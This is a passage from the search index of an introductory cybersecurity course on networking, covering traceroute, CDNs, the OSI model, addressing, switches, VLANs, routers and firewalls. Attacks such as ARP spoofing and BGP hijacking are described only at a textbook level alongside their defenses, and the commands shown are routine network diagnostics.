ms 2 10.0.0.1 (10.0.0.1) 5.678 ms 3 isp-router.net (203.0.113.1) 10.123 ms 4 backbone.net (198.51.100.1) 15.456 ms 5 ix-router.net (198.51.100.2) 20.789 ms 6 dest-network.com (93.184.216.34) 25.012 ms Each line shows: - Hop number - Router hostname/IP - Round-trip time Security note: Traceroute reveals network topology - Attackers use it for reconnaissance - Some networks block ICMP to prevent this","title":"Traceroute Analysis"},{"location":"LECTURES/unit2/lesson2-3/#content-delivery-networks-cdns","text":"","title":"Content Delivery Networks (CDNs)"},{"location":"LECTURES/unit2/lesson2-3/#the-problem","text":"Example: - User in Tokyo visits website hosted in New York - RTT: ~200 ms - Every resource (HTML, CSS, JS, images) requires round trips - Page load: slow","title":"The Problem"},{"location":"LECTURES/unit2/lesson2-3/#the-solution-cdns","text":"CDN caching: 1. Content replicated to edge servers worldwide 2. User's request routed to nearest edge server 3. Edge server returns cached content 4. Much lower latency How it works: # Without CDN User (Tokyo) \u2192 New York server (200 ms RTT) # With CDN User (Tokyo) \u2192 Tokyo edge server (5 ms RTT) Major CDNs: - Cloudflare - Akamai - Amazon CloudFront - Fastly - Google Cloud CDN CDN benefits: - Reduced latency - Reduced origin server load - DDoS protection - Geographic availability Security implications: - CDN sees all your traffic - Trust model changes - SSL/TLS termination at CDN - Additional attack surface","title":"The Solution: CDNs"},{"location":"LECTURES/unit2/lesson2-3/#quality-of-service-qos","text":"","title":"Quality of Service (QoS)"},{"location":"LECTURES/unit2/lesson2-3/#prioritizing-traffic","text":"Not all traffic is equal: - Video call: needs low latency - File download: needs high bandwidth - Web browsing: needs both - Email: neither critical QoS mechanisms: Traffic classification: VoIP packets \u2192 High priority queue Streaming video \u2192 Medium priority queue File transfer \u2192 Low priority queue Implementation: - Routers examine packets - Classify by port, protocol, or application - Queue accordingly - Process high-priority first DSCP (Differentiated Services Code Point): - Field in IP header - Marks packet priority - Routers respect marking","title":"Prioritizing Traffic"},{"location":"LECTURES/unit2/lesson2-3/#multicast-and-broadcast","text":"","title":"Multicast and Broadcast"},{"location":"LECTURES/unit2/lesson2-3/#unicast-normal","text":"One sender, one receiver: Client \u2192 Server","title":"Unicast (Normal)"},{"location":"LECTURES/unit2/lesson2-3/#broadcast","text":"One sender, all receivers on network: Sender \u2192 Everyone on 192.168.1.0/24 Example: ARP requests Address: 255.255.255.255 Problem: Doesn't scale, creates noise","title":"Broadcast"},{"location":"LECTURES/unit2/lesson2-3/#multicast","text":"One sender, multiple interested receivers: Video stream \u2192 Subscribers only Example: Live video streaming Addresses: 224.0.0.0 to 239.255.255.255 Protocol: IGMP (Internet Group Management Protocol) Efficiency: - Send once, received by many - Saves bandwidth - Used for streaming, conferencing","title":"Multicast"},{"location":"LECTURES/unit2/lesson2-3/#security-implications","text":"","title":"Security Implications"},{"location":"LECTURES/unit2/lesson2-3/#packet-sniffing","text":"Any device on network segment can capture packets: - Promiscuous mode - See all unencrypted traffic - Passwords, cookies, data Protection: Encryption (HTTPS, VPN)","title":"Packet Sniffing"},{"location":"LECTURES/unit2/lesson2-3/#man-in-the-middle","text":"Attacker intercepts traffic: 1. ARP spoofing (become gateway) 2. Route traffic through attacker 3. Forward to real destination 4. Victim and server unaware Protection: - ARP inspection - HTTPS (attacker can't decrypt) - Certificate pinning","title":"Man-in-the-Middle"},{"location":"LECTURES/unit2/lesson2-3/#route-hijacking-bgp-hijacking","text":"Attacker announces false routes: - BGP (Border Gateway Protocol) controls internet routing - Malicious announcements redirect traffic - Traffic flows through attacker - Hard to detect Examples: - 2008: Pakistan Telecom hijacked YouTube - 2018: Amazon Route 53 DNS hijacked - Ongoing nation-state attacks Protection: - RPKI (Resource Public Key Infrastructure) - Monitoring BGP announcements - Redundant paths","title":"Route Hijacking (BGP Hijacking)"},{"location":"LECTURES/unit2/lesson2-3/#ddos-amplification","text":"Attacker amplifies traffic: 1. Sends small requests with spoofed source (victim's IP) 2. Servers send large responses to victim 3. Victim overwhelmed Protocols vulnerable: - DNS (50x amplification) - NTP (200x amplification) - SSDP (30x amplification) - Memcached (10,000x+ amplification) Protection: - Rate limiting - Source validation - Filtering spoofed packets - DDoS mitigation services","title":"DDoS Amplification"},{"location":"LECTURES/unit2/lesson2-3/#practical-exercises","text":"","title":"Practical Exercises"},{"location":"LECTURES/unit2/lesson2-3/#1-trace-your-traffic","text":"# Capture packets sudo tcpdump -i eth0 -w capture.pcap # Visit a website curl http://example.com # Stop capture (Ctrl+C) # Analyze with Wireshark wireshark capture.pcap Observe: - DNS query and response - TCP three-way handshake - HTTP request and response - TCP teardown","title":"1. Trace Your Traffic"},{"location":"LECTURES/unit2/lesson2-3/#2-measure-latency","text":"# Ping local gateway ping 192.168.1.1 # Ping Google DNS ping 8.8.8.8 # Ping international server ping example.com # Compare RTTs","title":"2. Measure Latency"},{"location":"LECTURES/unit2/lesson2-3/#3-trace-route","text":"traceroute example.com # Count hops # Identify ISP transitions # Note latency increases","title":"3. Trace Route"},{"location":"LECTURES/unit2/lesson2-3/#4-monitor-your-traffic","text":"# Install iftop sudo apt install iftop # Monitor bandwidth usage sudo iftop -i eth0","title":"4. Monitor Your Traffic"},{"location":"LECTURES/unit2/lesson2-3/#key-takeaways","text":"Data travels as packets: - Broken into small pieces - Each routed independently - Reassembled at destination Each layer adds headers: - Encapsulation going out - De-encapsulation coming in Internet routing is dynamic: - Multiple paths possible - Routers make decisions hop-by-hop - BGP controls large-scale routing Security at every hop: - Local network (ARP spoofing) - Transit (packet sniffing) - Routing (BGP hijacking) - Destination (DDoS) Performance factors: - Physical distance - Number of hops - Network congestion - CDNs and caching Understanding this journey helps you: - Diagnose network issues - Identify attack points - Design secure systems - Optimize performance Every cybersecurity professional needs to understand how data flows\u2014it's the foundation for everything else we do.","title":"Key Takeaways"},{"location":"LECTURES/unit3/lesson3-1/","text":"Computer Networks: A Deep Dive Now that you understand what the internet is at a high level, let's zoom in and examine how computer networks actually function. This is where things get technical, but also where you'll start to see how security vulnerabilities emerge. What is a Network? A computer network is simply two or more devices connected together to share resources and communicate. That's it. Your home setup with a laptop, phone, and printer connected to a router? That's a network. A corporation with thousands of computers across multiple buildings? Also a network, just bigger and more complex. Networks exist at different scales: - PAN (Personal Area Network) : Your personal devices, like your phone and wireless earbuds - LAN (Local Area Network) : Devices in a home, office, or building - MAN (Metropolitan Area Network) : Networks spanning a city - WAN (Wide Area Network) : Networks spanning large geographic areas (the internet is the largest WAN) Network Topologies The topology of a network refers to how devices are arranged and connected. Each topology has different security implications: Bus Topology All devices connect to a single cable (the \"bus\"). Data travels along the bus until it reaches its destination. This is rare today because: - If the bus cable fails, the entire network goes down - All traffic is visible to all devices (major security problem) - Performance degrades as more devices connect Star Topology All devices connect to a central hub or switch. This is the most common topology in modern networks. Your home router is the center of a star topology. - If one connection fails, only that device is affected - Easier to manage and troubleshoot - The central device is a single point of failure - Better security than bus because traffic can be isolated Ring Topology Devices are connected in a circle. Data travels around the ring in one direction. Used in some specialized networks. - If one device fails, it can break the whole network (unless it's a dual ring) - Predictable performance - Data passes through multiple devices (security concern) Mesh Topology Every device connects to every other device. Highly redundant and reliable. Used in critical infrastructure and some wireless networks. - Extremely reliable\u2014multiple paths for data - Expensive and complex to implement - Common in military and critical systems - Redundancy helps security, but more connections mean more potential vulnerabilities In reality, most networks use hybrid topologies \u2014combinations of these basic types depending on needs and scale. The OSI Model: The Foundation The OSI (Open Systems Interconnection) Model is a conceptual framework that describes how data moves through a network. It has seven layers, each with specific responsibilities. Understanding this is crucial for cybersecurity because attacks can target any layer. Layer 7: Application Layer This is what you interact with\u2014web browsers, email clients, file transfer applications. - Protocols : HTTP, HTTPS, FTP, SMTP, DNS - Security concerns : SQL injection, cross-site scripting (XSS), application-level attacks - Example : When you visit a website, this layer handles the request Layer 6: Presentation Layer Handles data formatting, encryption, and compression. It ensures data from one system can be read by another. - Protocols : SSL/TLS, JPEG, GIF, MPEG - Security concerns : Encryption weaknesses, data encoding attacks - Example : When HTTPS encrypts your password before sending it Layer 5: Session Layer Manages sessions between applications\u2014establishing, maintaining, and terminating connections. - Protocols : NetBIOS, RPC, PPTP - Security concerns : Session hijacking, man-in-the-middle attacks - Example : Keeping you logged into a website as you navigate between pages Layer 4: Transport Layer Ensures complete data transfer with error checking and flow control. This is where TCP and UDP operate. - Protocols : TCP, UDP - Security concerns : Port scanning, TCP SYN floods, DoS attacks - Example : Breaking your file download into packets and ensuring they all arrive Layer 3: Network Layer Handles routing and forwarding of data packets between networks. This is where IP addressing happens. - Protocols : IP, ICMP, IPsec - Security concerns : IP spoofing, routing attacks, ICMP flooding - Example : Determining the path your data takes from your house to a server across the country Layer 2: Data Link Layer Handles communication between adjacent network nodes. Deals with MAC addresses and switches. - Protocols : Ethernet, Wi-Fi (802.11), PPP - Security concerns : MAC spoofing, ARP poisoning, VLAN hopping - Example : Your computer communicating with your router Layer 1: Physical Layer The actual physical medium\u2014cables, radio waves, fiber optics. Raw transmission of bits. - Components : Cables, hubs, repeaters, network adapters - Security concerns : Physical tapping, electromagnetic interference, cable cutting - Example : The actual electrical signals on an Ethernet cable Why the OSI Model Matters for Security Here's the critical insight: attacks can happen at any layer , and defenses must exist at every layer. If you only secure Layer 7 (application) but ignore Layer 2 (data link), an attacker could compromise your network through ARP poisoning. If you secure everything but forget about Layer 1 (physical), someone could literally tap into your cables. When analyzing security incidents, you'll often need to trace through these layers to find where the attack occurred and how it succeeded. TCP/IP Model: The Practical Version While the OSI model is conceptual, the TCP/IP model is what actually runs the internet. It has four layers that map roughly to the OSI model: Application Layer (combines OSI layers 5-7): HTTP, FTP, DNS, SMTP Transport Layer (OSI layer 4): TCP, UDP Internet Layer (OSI layer 3): IP, ICMP, ARP Network Access Layer (combines OSI layers 1-2): Ethernet, Wi-Fi You'll see both models referenced in cybersecurity. The OSI model is better for understanding and teaching, while TCP/IP is better for practical implementation. Switching vs. Routing Two fundamental concepts in networking: Switching (Layer 2) Switches connect devices within the same network. They use MAC addresses to forward data to the correct device. - MAC addresses are hardware addresses burned into network cards - Switches learn which MAC addresses are on which ports - Creates separate collision domains (better performance) - All devices on a switch can potentially see each other's traffic (security concern) Routing (Layer 3) Routers connect different networks together. They use IP addresses to forward packets between networks. - Make decisions about the best path for data - Connect your home network to your ISP and ultimately the internet - Implement Network Address Translation (NAT) - Can filter traffic based on rules (basic firewall functionality) In cybersecurity, you need to understand both because attacks might exploit switching (like ARP poisoning) or routing (like BGP hijacking). Network Addressing Let's talk more about how devices are identified on networks: MAC Addresses Format : 00:1A:2B:3C:4D:5E (six pairs of hexadecimal digits) Scope : Only relevant on the local network Purpose : Hardware identification Security note : Can be spoofed (changed in software), used for tracking devices IP Addresses (IPv4) Format : 192.168.1.100 (four octets, 0-255) Public vs. Private : Some ranges are reserved for private networks 10.0.0.0 to 10.255.255.255 172.16.0.0 to 172.31.255.255 192.168.0.0 to 192.168.255.255 Purpose : Identifying devices across networks Security note : Can be spoofed, reveal geographic location Ports Range : 0-65535 Purpose : Identify specific services or applications on a device Well-known ports : 80: HTTP 443: HTTPS 22: SSH 21: FTP 25: SMTP Security note : Open ports are attack vectors; port scanning is a reconnaissance technique Subnetting: Dividing Networks Subnetting is the practice of dividing a network into smaller sub-networks. This improves performance and security by isolating traffic. A subnet mask determines which part of an IP address is the network portion and which is the host portion. - Example: 255.255.255.0 means the first three octets identify the network, the last octet identifies individual hosts - CIDR notation: 192.168.1.0/24 means the same thing (24 bits for network, 8 bits for hosts) Why this matters for security: - You can isolate sensitive systems on separate subnets - Apply different security policies to different subnets - Limit lateral movement in case of a breach - Implement network segmentation Protocols in Detail Let's examine some key protocols you'll encounter: TCP (Transmission Control Protocol) Connection-oriented : Establishes a connection before sending data Reliable : Ensures all packets arrive and are in order Three-way handshake : SYN \u2192 SYN-ACK \u2192 ACK Use cases : Web browsing, email, file transfers Security implications : Can be exploited (SYN floods), but reliability helps prevent data corruption UDP (User Datagram Protocol) Connectionless : Just sends data without establishing a connection Unreliable : No guarantee packets arrive or are in order Faster : Less overhead than TCP Use cases : Video streaming, online gaming, DNS queries Security implications : Can be used for amplification attacks, harder to filter ICMP (Internet Control Message Protocol) Purpose : Error messages and network diagnostics Tools : Ping and traceroute use ICMP Security implications : Can be used for reconnaissance, covert channels, DDoS attacks (ping floods) ARP (Address Resolution Protocol) Purpose : Maps IP addresses to MAC addresses on local networks How it works : Broadcasts \"Who has IP 192.168.1.1?\" and the device with that IP responds with its MAC address Security implications : Easily exploited for man-in-the-middle attacks (ARP spoofing/poisoning) Network Security Basics Every network needs security controls: Firewalls Filter traffic based on rules\u2014which IPs, ports, and protocols are allowed or blocked. Can operate at different layers. VLANs (Virtual LANs) Logically segment a network even if devices are physically on the same switch. Improves security and performance. NAT (Network Address Translation) Allows multiple devices to share a single public IP address. Provides a basic security layer by hiding internal network structure. Access Control Lists (ACLs) Rules that permit or deny traffic based on various criteria. Used in routers and firewalls. Wireless Networks Wi-Fi adds another dimension to network security: - Broadcasting : Wireless networks advertise their presence - Range : Signals extend beyond physical buildings - Encryption : WPA3 is current standard, older WEP and WPA are broken - Attacks : Evil twin access points, packet sniffing, de-authentication attacks We'll cover wireless security in much more depth later, but remember that anything transmitted over the air can potentially be intercepted. What's Next? In the following units, we'll build on this foundation: - Apply these concepts to real-world security scenarios - Learn to analyze network traffic and identify anomalies - Study specific attacks that exploit network protocols - Implement defenses at different network layers Understanding networks is fundamental to cybersecurity. Most attacks travel over networks, most data breaches involve network exploitation, and most defenses involve network controls. The key insight: networks are complex systems with many moving parts, and each part is a potential security concern . But with understanding comes the ability to secure them effectively.","title":"Lesson 3.1"},{"location":"LECTURES/unit3/lesson3-1/#computer-networks-a-deep-dive","text":"Now that you understand what the internet is at a high level, let's zoom in and examine how computer networks actually function. This is where things get technical, but also where you'll start to see how security vulnerabilities emerge.","title":"Computer Networks: A Deep Dive"},{"location":"LECTURES/unit3/lesson3-1/#what-is-a-network","text":"A computer network is simply two or more devices connected together to share resources and communicate. That's it. Your home setup with a laptop, phone, and printer connected to a router? That's a network. A corporation with thousands of computers across multiple buildings? Also a network, just bigger and more complex. Networks exist at different scales: - PAN (Personal Area Network) : Your personal devices, like your phone and wireless earbuds - LAN (Local Area Network) : Devices in a home, office, or building - MAN (Metropolitan Area Network) : Networks spanning a city - WAN (Wide Area Network) : Networks spanning large geographic areas (the internet is the largest WAN)","title":"What is a Network?"},{"location":"LECTURES/unit3/lesson3-1/#network-topologies","text":"The topology of a network refers to how devices are arranged and connected. Each topology has different security implications:","title":"Network Topologies"},{"location":"LECTURES/unit3/lesson3-1/#bus-topology","text":"All devices connect to a single cable (the \"bus\"). Data travels along the bus until it reaches its destination. This is rare today because: - If the bus cable fails, the entire network goes down - All traffic is visible to all devices (major security problem) - Performance degrades as more devices connect","title":"Bus Topology"},{"location":"LECTURES/unit3/lesson3-1/#star-topology","text":"All devices connect to a central hub or switch. This is the most common topology in modern networks. Your home router is the center of a star topology. - If one connection fails, only that device is affected - Easier to manage and troubleshoot - The central device is a single point of failure - Better security than bus because traffic can be isolated","title":"Star Topology"},{"location":"LECTURES/unit3/lesson3-1/#ring-topology","text":"Devices are connected in a circle. Data travels around the ring in one direction. Used in some specialized networks. - If one device fails, it can break the whole network (unless it's a dual ring) - Predictable performance - Data passes through multiple devices (security concern)","title":"Ring Topology"},{"location":"LECTURES/unit3/lesson3-1/#mesh-topology","text":"Every device connects to every other device. Highly redundant and reliable. Used in critical infrastructure and some wireless networks. - Extremely reliable\u2014multiple paths for data - Expensive and complex to implement - Common in military and critical systems - Redundancy helps security, but more connections mean more potential vulnerabilities In reality, most networks use hybrid topologies \u2014combinations of these basic types depending on needs and scale.","title":"Mesh Topology"},{"location":"LECTURES/unit3/lesson3-1/#the-osi-model-the-foundation","text":"The OSI (Open Systems Interconnection) Model is a conceptual framework that describes how data moves through a network. It has seven layers, each with specific responsibilities. Understanding this is crucial for cybersecurity because attacks can target any layer.","title":"The OSI Model: The Foundation"},{"location":"LECTURES/unit3/lesson3-1/#layer-7-application-layer","text":"This is what you interact with\u2014web browsers, email clients, file transfer applications. - Protocols : HTTP, HTTPS, FTP, SMTP, DNS - Security concerns : SQL injection, cross-site scripting (XSS), application-level attacks - Example : When you visit a website, this layer handles the request","title":"Layer 7: Application Layer"},{"location":"LECTURES/unit3/lesson3-1/#layer-6-presentation-layer","text":"Handles data formatting, encryption, and compression. It ensures data from one system can be read by another. - Protocols : SSL/TLS, JPEG, GIF, MPEG - Security concerns : Encryption weaknesses, data encoding attacks - Example : When HTTPS encrypts your password before sending it","title":"Layer 6: Presentation Layer"},{"location":"LECTURES/unit3/lesson3-1/#layer-5-session-layer","text":"Manages sessions between applications\u2014establishing, maintaining, and terminating connections. - Protocols : NetBIOS, RPC, PPTP - Security concerns : Session hijacking, man-in-the-middle attacks - Example : Keeping you logged into a website as you navigate between pages","title":"Layer 5: Session Layer"},{"location":"LECTURES/unit3/lesson3-1/#layer-4-transport-layer","text":"Ensures complete data transfer with error checking and flow control. This is where TCP and UDP operate. - Protocols : TCP, UDP - Security concerns : Port scanning, TCP SYN floods, DoS attacks - Example : Breaking your file download into packets and ensuring they all arrive","title":"Layer 4: Transport Layer"},{"location":"LECTURES/unit3/lesson3-1/#layer-3-network-layer","text":"Handles routing and forwarding of data packets between networks. This is where IP addressing happens. - Protocols : IP, ICMP, IPsec - Security concerns : IP spoofing, routing attacks, ICMP flooding - Example : Determining the path your data takes from your house to a server across the country","title":"Layer 3: Network Layer"},{"location":"LECTURES/unit3/lesson3-1/#layer-2-data-link-layer","text":"Handles communication between adjacent network nodes. Deals with MAC addresses and switches. - Protocols : Ethernet, Wi-Fi (802.11), PPP - Security concerns : MAC spoofing, ARP poisoning, VLAN hopping - Example : Your computer communicating with your router","title":"Layer 2: Data Link Layer"},{"location":"LECTURES/unit3/lesson3-1/#layer-1-physical-layer","text":"The actual physical medium\u2014cables, radio waves, fiber optics. Raw transmission of bits. - Components : Cables, hubs, repeaters, network adapters - Security concerns : Physical tapping, electromagnetic interference, cable cutting - Example : The actual electrical signals on an Ethernet cable","title":"Layer 1: Physical Layer"},{"location":"LECTURES/unit3/lesson3-1/#why-the-osi-model-matters-for-security","text":"Here's the critical insight: attacks can happen at any layer , and defenses must exist at every layer. If you only secure Layer 7 (application) but ignore Layer 2 (data link), an attacker could compromise your network through ARP poisoning. If you secure everything but forget about Layer 1 (physical), someone could literally tap into your cables. When analyzing security incidents, you'll often need to trace through these layers to find where the attack occurred and how it succeeded.","title":"Why the OSI Model Matters for Security"},{"location":"LECTURES/unit3/lesson3-1/#tcpip-model-the-practical-version","text":"While the OSI model is conceptual, the TCP/IP model is what actually runs the internet. It has four layers that map roughly to the OSI model: Application Layer (combines OSI layers 5-7): HTTP, FTP, DNS, SMTP Transport Layer (OSI layer 4): TCP, UDP Internet Layer (OSI layer 3): IP, ICMP, ARP Network Access Layer (combines OSI layers 1-2): Ethernet, Wi-Fi You'll see both models referenced in cybersecurity. The OSI model is better for understanding and teaching, while TCP/IP is better for practical implementation.","title":"TCP/IP Model: The Practical Version"},{"location":"LECTURES/unit3/lesson3-1/#switching-vs-routing","text":"Two fundamental concepts in networking:","title":"Switching vs. Routing"},{"location":"LECTURES/unit3/lesson3-1/#switching-layer-2","text":"Switches connect devices within the same network. They use MAC addresses to forward data to the correct device. - MAC addresses are hardware addresses burned into network cards - Switches learn which MAC addresses are on which ports - Creates separate collision domains (better performance) - All devices on a switch can potentially see each other's traffic (security concern)","title":"Switching (Layer 2)"},{"location":"LECTURES/unit3/lesson3-1/#routing-layer-3","text":"Routers connect different networks together. They use IP addresses to forward packets between networks. - Make decisions about the best path for data - Connect your home network to your ISP and ultimately the internet - Implement Network Address Translation (NAT) - Can filter traffic based on rules (basic firewall functionality) In cybersecurity, you need to understand both because attacks might exploit switching (like ARP poisoning) or routing (like BGP hijacking).","title":"Routing (Layer 3)"},{"location":"LECTURES/unit3/lesson3-1/#network-addressing","text":"Let's talk more about how devices are identified on networks:","title":"Network Addressing"},{"location":"LECTURES/unit3/lesson3-1/#mac-addresses","text":"Format : 00:1A:2B:3C:4D:5E (six pairs of hexadecimal digits) Scope : Only relevant on the local network Purpose : Hardware identification Security note : Can be spoofed (changed in software), used for tracking devices","title":"MAC Addresses"},{"location":"LECTURES/unit3/lesson3-1/#ip-addresses-ipv4","text":"Format : 192.168.1.100 (four octets, 0-255) Public vs. Private : Some ranges are reserved for private networks 10.0.0.0 to 10.255.255.255 172.16.0.0 to 172.31.255.255 192.168.0.0 to 192.168.255.255 Purpose : Identifying devices across networks Security note : Can be spoofed, reveal geographic location","title":"IP Addresses (IPv4)"},{"location":"LECTURES/unit3/lesson3-1/#ports","text":"Range : 0-65535 Purpose : Identify specific services or applications on a device Well-known ports : 80: HTTP 443: HTTPS 22: SSH 21: FTP 25: SMTP Security note : Open ports are attack vectors; port scanning is a reconnaissance technique","title":"Ports"},{"location":"LECTURES/unit3/lesson3-1/#subnetting-dividing-networks","text":"Subnetting is the practice of dividing a network into smaller sub-networks. This improves performance and security by isolating traffic. A subnet mask determines which part of an IP address is the network portion and which is the host portion. - Example: 255.255.255.0 means the first three octets identify the network, the last octet identifies individual hosts - CIDR notation: 192.168.1.0/24 means the same thing (24 bits for network, 8 bits for hosts) Why this matters for security: - You can isolate sensitive systems on separate subnets - Apply different security policies to different subnets - Limit lateral movement in case of a breach - Implement network segmentation","title":"Subnetting: Dividing Networks"},{"location":"LECTURES/unit3/lesson3-1/#protocols-in-detail","text":"Let's examine some key protocols you'll encounter:","title":"Protocols in Detail"},{"location":"LECTURES/unit3/lesson3-1/#tcp-transmission-control-protocol","text":"Connection-oriented : Establishes a connection before sending data Reliable : Ensures all packets arrive and are in order Three-way handshake : SYN \u2192 SYN-ACK \u2192 ACK Use cases : Web browsing, email, file transfers Security implications : Can be exploited (SYN floods), but reliability helps prevent data corruption","title":"TCP (Transmission Control Protocol)"},{"location":"LECTURES/unit3/lesson3-1/#udp-user-datagram-protocol","text":"Connectionless : Just sends data without establishing a connection Unreliable : No guarantee packets arrive or are in order Faster : Less overhead than TCP Use cases : Video streaming, online gaming, DNS queries Security implications : Can be used for amplification attacks, harder to filter","title":"UDP (User Datagram Protocol)"},{"location":"LECTURES/unit3/lesson3-1/#icmp-internet-control-message-protocol","text":"Purpose : Error messages and network diagnostics Tools : Ping and traceroute use ICMP Security implications : Can be used for reconnaissance, covert channels, DDoS attacks (ping floods)","title":"ICMP (Internet Control Message Protocol)"},{"location":"LECTURES/unit3/lesson3-1/#arp-address-resolution-protocol","text":"Purpose : Maps IP addresses to MAC addresses on local networks How it works : Broadcasts \"Who has IP 192.168.1.1?\" and the device with that IP responds with its MAC address Security implications : Easily exploited for man-in-the-middle attacks (ARP spoofing/poisoning)","title":"ARP (Address Resolution Protocol)"},{"location":"LECTURES/unit3/lesson3-1/#network-security-basics","text":"Every network needs security controls:","title":"Network Security Basics"},{"location":"LECTURES/unit3/lesson3-1/#firewalls","text":"Filter traffic based on rules\u2014which IPs, ports, and protocols are allowed or blocked. Can operate at different layers.","title":"Firewalls"},{"location":"LECTURES/unit3/lesson3-1/#vlans-virtual-lans","text":"Logically segment a network even if devices are physically on the same switch. Improves security and performance.","title":"VLANs (Virtual LANs)"},{"location":"LECTURES/unit3/lesson3-1/#nat-network-address-translation","text":"Allows multiple devices to share a single public IP address. Provides a basic security layer by hiding internal network structure.","title":"NAT (Network Address Translation)"},{"location":"LECTURES/unit3/lesson3-1/#access-control-lists-acls","text":"Rules that permit or deny traffic based on various criteria. Used in routers and firewalls.","title":"Access Control Lists (ACLs)"},{"location":"LECTURES/unit3/lesson3-1/#wireless-networks","text":"Wi-Fi adds another dimension to network security: - Broadcasting : Wireless networks advertise their presence - Range : Signals extend beyond physical buildings - Encryption : WPA3 is current standard, older WEP and WPA are broken - Attacks : Evil twin access points, packet sniffing, de-authentication attacks We'll cover wireless security in much more depth later, but remember that anything transmitted over the air can potentially be intercepted.","title":"Wireless Networks"},{"location":"LECTURES/unit3/lesson3-1/#whats-next","text":"In the following units, we'll build on this foundation: - Apply these concepts to real-world security scenarios - Learn to analyze network traffic and identify anomalies - Study specific attacks that exploit network protocols - Implement defenses at different network layers Understanding networks is fundamental to cybersecurity. Most attacks travel over networks, most data breaches involve network exploitation, and most defenses involve network controls. The key insight: networks are complex systems with many moving parts, and each part is a potential security concern . But with understanding comes the ability to secure them effectively.","title":"What's Next?"},{"location":"LECTURES/unit3/lesson3-2/","text":"Network Devices and Hardware Networks aren't just cables and wireless signals. They're made up of specialized hardware devices, each with specific functions. Understanding these devices is crucial\u2014they're both security tools and attack targets. Network Interface Cards (NICs) NICs connect computers to networks. Physical Network Cards Wired NIC (Ethernet): - RJ-45 connector - Speeds: 10/100/1000 Mbps (Gigabit), 10 Gbps, 40 Gbps - Built into motherboard or expansion card - MAC address burned into hardware Wireless NIC (Wi-Fi): - Antenna (internal or external) - Standards: 802.11a/b/g/n/ac/ax (Wi-Fi 6) - USB adapters, PCIe cards, built-in - Can operate in monitor mode (packet sniffing) MAC Addresses MAC (Media Access Control) address: - 48-bit hardware address - Format: 00:1A:2B:3C:4D:5E (6 pairs of hex) - First 3 bytes: OUI (Organizationally Unique Identifier) - identifies manufacturer - Last 3 bytes: Device-specific Example: 00:1A:2B \u2192 Cisco Systems 3C:4D:5E \u2192 Unique device ID View your MAC address: # Linux ip link show ifconfig # Windows ipconfig /all # macOS ifconfig Security note: - MAC addresses can be spoofed (changed in software) - Used for tracking devices - MAC filtering on networks (weak security) Hubs (Obsolete) Hubs: Simple repeaters, rarely used today. How Hubs Work Receives packet on one port Broadcasts to ALL other ports All devices see all traffic Devices ignore packets not addressed to them Problems with Hubs Collisions: - Only one device can transmit at a time - If two transmit simultaneously \u2192 collision - Both must wait and retry - Inefficient as network grows Security: - Every device sees all traffic - Easy packet sniffing - No segmentation Hubs are dead. Replaced by switches. Switches Switches: Intelligent devices that forward packets only to intended recipient. How Switches Work MAC address table (CAM table): Port | MAC Address ------|------------------ 1 | 00:1A:2B:3C:4D:5E 2 | 11:22:33:44:55:66 3 | AA:BB:CC:DD:EE:FF Learning process: 1. Device sends packet 2. Switch sees source MAC and source port 3. Records in MAC table 4. Now knows which port leads to that MAC Forwarding: 1. Packet arrives for destination MAC 2. Switch checks MAC table 3. Forwards only to port where MAC is located 4. Other ports don't see the traffic Unknown destinations: - If MAC not in table, switch floods (sends to all ports except source) - Destination responds, switch learns Switch Types Unmanaged switches: - Plug and play - No configuration - Limited features - Home/small office use Managed switches: - Configurable via CLI or web interface - VLANs - Port mirroring - Quality of Service (QoS) - Access control lists - SNMP monitoring - Enterprise use Layer 2 vs Layer 3 switches: Layer 2: Forward based on MAC addresses (traditional) Layer 3: Also perform routing (IP-based forwarding) - Combine switch and router functionality - Faster than traditional routing - Common in enterprise core networks VLANs (Virtual LANs) VLANs logically segment a network: Without VLANs: - All devices on one switch in same broadcast domain - Everyone sees broadcasts - No logical separation With VLANs: Switch with 24 ports: VLAN 10 (Sales): Ports 1-8 VLAN 20 (Engineering): Ports 9-16 VLAN 30 (Guest): Ports 17-24 Benefits: - Security isolation - Broadcast control - Logical organization - Easier management Inter-VLAN routing: - VLANs can't talk to each other without routing - Layer 3 switch or router required - Apply firewall rules between VLANs VLAN tagging (802.1Q): - Adds VLAN ID to Ethernet frame - Trunk ports carry multiple VLANs - Access ports belong to single VLAN Switch Security Features Port security: - Limit which MAC addresses can use a port - Prevent MAC flooding attacks - Limit number of MACs per port DHCP snooping: - Prevents rogue DHCP servers - Builds trusted database of IP-MAC bindings - Prevents DHCP starvation attacks Dynamic ARP Inspection (DAI): - Uses DHCP snooping database - Validates ARP packets - Drops ARP packets with mismatched IP-MAC - Prevents ARP spoofing Port mirroring (SPAN): - Copy traffic from one port to another - Used for monitoring/analysis - Connect IDS/packet analyzer - Essential security tool Routers Routers: Connect different networks, make forwarding decisions based on IP addresses. Router Functions Routing: - Examines destination IP - Consults routing table - Forwards to next hop NAT (Network Address Translation): - Translates private IPs to public IP - Allows multiple devices to share one public IP - Adds layer of security (hides internal network) Firewall: - Filter traffic based on rules - Stateful packet inspection - Access control lists (ACLs) DHCP: - Assigns IP addresses automatically - Provides subnet mask, gateway, DNS servers VPN: - Encrypted tunnels - Remote access - Site-to-site connections Routing Tables View routing table: # Linux ip route show route -n # Windows route print # Cisco router show ip route Example routing table: Destination Gateway Interface 0.0.0.0/0 192.168.1.1 eth0 (default route) 192.168.1.0/24 0.0.0.0 eth0 (directly connected) 10.0.0.0/8 192.168.1.254 eth0 (static route) Route types: - Connected: Directly attached networks - Static: Manually configured - Dynamic: Learned via routing protocols (OSPF, BGP, EIGRP) Routing Protocols Interior Gateway Protocols (within an organization): RIP (Routing Information Protocol): - Distance vector (hop count) - Simple but limited - Max 15 hops - Legacy OSPF (Open Shortest Path First): - Link state protocol - Considers bandwidth, not just hops - Fast convergence - Scalable - Enterprise standard EIGRP (Enhanced Interior Gateway Routing Protocol): - Cisco proprietary (mostly) - Hybrid protocol - Fast convergence - Efficient Exterior Gateway Protocols (between organizations): BGP (Border Gateway Protocol): - How the internet works - Path vector protocol - Policy-based routing - AS (Autonomous System) numbers - Extremely complex - Targeted by nation-state attackers Router Security Best practices: - Change default passwords - Disable unnecessary services - Keep firmware updated - Use strong encryption (WPA3 for wireless) - Enable logging - Implement ACLs - Disable remote management (or use VPN) Common vulnerabilities: - Default credentials - Outdated firmware - UPnP (Universal Plug and Play) exploits - DNS hijacking - Weak wireless encryption Firewalls Firewalls: Specialized security devices that filter traffic based on rules. Firewall Types by Deployment Network firewalls: - Standalone hardware devices - Protect entire networks - High throughput - Expensive Host-based firewalls: - Software on individual computers - Windows Firewall, iptables, pf - 